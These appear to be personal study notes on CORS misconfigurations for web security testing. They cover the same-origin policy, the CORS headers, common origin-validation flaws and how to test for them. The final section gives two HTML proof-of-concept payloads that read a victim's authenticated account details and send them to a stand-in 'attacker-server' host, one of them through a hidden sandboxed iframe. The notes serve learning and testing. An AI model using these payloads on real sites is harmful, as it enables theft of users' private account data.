### Table of Contents
1. SOP - Same-Origin Policy
2. Source Code Example(s)
3. Header Flags
4. Vulnerabilities
5. Finding CORS
6. Exploiting CORS Vulns

[Good Resource]: https://portswigger.net/research/exploiting-cors-misconfigurations-for-bitcoins-and-bounties
[Video Version]: https://www.youtube.com/watch?v=wgkj4ZgxI4c
[Another Resource]: https://quitten.github.io/StackStorm/

-------------------------------------------------------------------

### 1. SOP - Same-Origin Policy
+ Browser bontrols access to data b/w web apps
+ This **DOES NOT** prevent **WRITING** b/w web apps
 - only _reading_
 
**Access b/w origins**
_scheme, hotname, and port must match_

+ scheme (protocol)
 - Example: `https`
+ hostname (domain)
 - Example: `test.com`
+ port
 - Example: `443`

-------------------------------------------------------------------

### 2. Source Code Example(s)
```Java
@CrossOrigins(origins = "http://domain2.com")
public class AccountController {
    [...]
}
```

-------------------------------------------------------------------

### 3. Header Flags

[Header1]: Access-Control-Allow-Origin
+ Whether the response can be shared with requesting code from the given origin
  1. `Access-Control-Allow-Origin: *`
    - allows all
  
  2. `Access-Control-Allow-Origin: <origin>`
    + specify **ONE origin**
    + **CANNOT do multiple**
     - This is why CORS exists a lot
     - To do securely must do **dynamic generation**
     
  3. `Access-Control-Allow-Origin: null`
    + COR Redirect
    + Sandboxed COR requests
  
[Header2]: Access-Control-Allow-Credentials
* Example: `Access-Control-Allow-Credentials: true`
* Or it's not set at all

* If wildcard `*` is set **CREDS NOT ALLOWED**
`Access-Control-Allow-Credentials: *`

Creds can be to be included; such as:
+ Allows cookies 
+ Authorization Headers
+ TLS Certificates

-------------------------------------------------------------------

### 4. Vulnerabilities

1. Extracintg _origin from request (client controlled)_ and putting it in the
   _server_ generated `Access-Control-Allow Origin`

2. Errors in how server _parses orgin headers_
  + Such as granting access to all domains that _end in a specific string_ `(like bank.com)`
   - Attacker just makes a bypass like `maliciousbank.com`
   
  + Such as granting access to all domains that _start in a specific string_ `(like bank.com)`
   - Attacker bypsses with something like `bank.com.malicious.com`
   
3. Whitelisting `null` origin value
  + Equivalent to a wildcard `*`
  + Like an _sandboxed iframe_ -  which will make it seem null
  + `null` allows access to _credentialed resources_

-------------------------------------------------------------------

### 5. Find CORS

* Gray-Box: Start by black-box testing then when you find something, look at source code

**Black-Box**  
+ Mapp application
+ Test the app for dynamic generation
 - Does it _reflect_ the _user-supplied_ `ACAO header`?
 - Does it validate the _start/end_ of a _specific string_?
 - Does it allow a null origin?
  * Put null in header
 - Does it restrict the protocol
 - Does it allow credentials?
  * Check header
 
**White-Box**  
+ Identify framework
+ What technology allows for CORS configuration
+ Review code to identify misconfigurations in CORS rules

-------------------------------------------------------------------

### 6. Exploiting CORS Vulns

1. If app allows for **credentials**
  + Server genrated _user supplied_ `Origin`
  + Validate on the _start/end_ of a `specific string`
  
```PoC
<html>
    <body>
    <h1>Hello</h1>
    <script>
        var xhr = new XMLHttpRequest();
        var url = 'https://vulnerable-site.com';
        
        xhr.onreadystatechange = function() {
            if (xhr.readyState == XMLHttpRequest.DONE) {
                fetch('/log?key=' + xhr.responseText)
            }
        }
        
        xhr.open('GET', url + '/accountDetails', true);
        xhr.withCredentials = true;
        xhr.send(null);
    </script>
    </body>
</html>
```

   ==========================================================

2. If App allows for **credentials**
  + Access-Control-Allow-Origin: `null`
  + Server genrated _user supplied_ `Origin`
  + Validate on the _start/end_ of a `specific string`
  
```PoC-Run_In_iframe
<html>
    <body>
    <h1>Hello</h1>
    <iframe style="display: none;" sandbox="allow-scripts" srcdoc="
    <script>
        var xhr = new XMLHttpRequest();
        var url = 'https://vulnerable-site.com';
        
        xhr.onreadystatechange = function() {
            if (xhr.readyState == XMLHttpRequest.DONE) {
                fetch('http://attacker-server:4444/log?key=' + xhr.responseText)
            }
        }
        
        xhr.open('GET', url + '/accountDetails', true);
        xhr.withCredentials = true;
        xhr.send(null)
    </script>"></iframe>
    </body>
</html>
```

3. If app _DOES NOT_ allow for credentials
  + Does it have security impact?
[Real World Example]: http://blog.saynotolinux.com/blog/2016/08/15/jetbrains-ide-remote-code-execution-and-local-file-disclosure-vulnerability-analysis/

  + Can be vulnerable form **with the Internal Network**
  + If `localhost webserver` _allows all_
   - A user clicks a malicious site
   - The site _asks the browser_ to _request ssh creds_ from the `local server`
   
4. Automated - WAVS (Web Application Vulnerability Scanners)


-------------------------------------------------------------------

